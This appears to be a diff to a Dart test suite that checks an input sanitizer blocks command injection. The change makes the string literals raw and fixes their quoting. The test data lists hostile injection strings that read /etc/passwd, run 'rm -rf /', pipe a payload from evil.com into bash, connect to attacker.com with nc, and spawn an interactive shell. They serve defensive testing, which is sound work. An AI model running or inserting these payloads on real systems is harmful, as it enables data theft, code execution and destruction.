@@ -263,10 +263,10 @@ void main() {
     group('Advanced Injection Techniques', () {
       test('blocks nested command injection', () {
         final nestedAttacks = [
-          'user; `cat /etc/passwd`',
-          'name| $(whoami)',
-          'input&& `curl http://evil.com`',
-          'filename; $(ls -la)',
+          r'user; `cat /etc/passwd`',
+          r'name| $(whoami)',
+          r'input&& `curl http://evil.com`',
+          r'filename; $(ls -la)',
         ];
         
         for (final attack in nestedAttacks) {
@@ -282,8 +282,8 @@ void main() {
         final chainingAttacks = [
           'user; cat /etc/passwd && rm -rf /',
           'name| whoami || wget http://evil.com',
-          'input`hostname`; ping -c 3 google.com',
-          'filename$(ls -la)| grep secret',
+          r'input`hostname`; ping -c 3 google.com',
+          r'filename$(ls -la)| grep secret',
         ];
         
         for (final attack in chainingAttacks) {
@@ -338,7 +338,7 @@ void main() {
           'user| nc attacker.com 4444',
           'name| wget http://evil.com/shell.sh',
           'input&& curl -s http://evil.com/payload | bash',
-          'filename`python -c "import socket; subprocess.run(['bash', '-i'])"`',
+          "filename`python -c \"import socket; subprocess.run(['bash', '-i'])\"`",
         ];
         
         for (final attack in networkAttacks) {
